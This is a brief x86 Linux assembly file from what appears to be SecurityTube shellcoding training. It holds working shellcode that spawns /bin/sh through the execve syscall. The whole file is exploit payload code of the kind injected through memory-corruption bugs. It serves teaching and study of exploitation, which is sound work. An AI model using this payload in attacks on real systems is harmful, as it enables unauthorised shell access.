; Filename: execve.nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
;
;
; Purpose:  Simple execve /bin/sh shell code

global _start			

section .text
_start:

	; Execute /bin/sh using execve syscall

	xor eax, eax
	push eax
	push 0x68732f6e
	push 0x69622f2f

	mov ebx, esp

	push eax
	mov edx, esp

	push ebx
	mov ecx, esp

	mov al, 0xb
	int 0x80

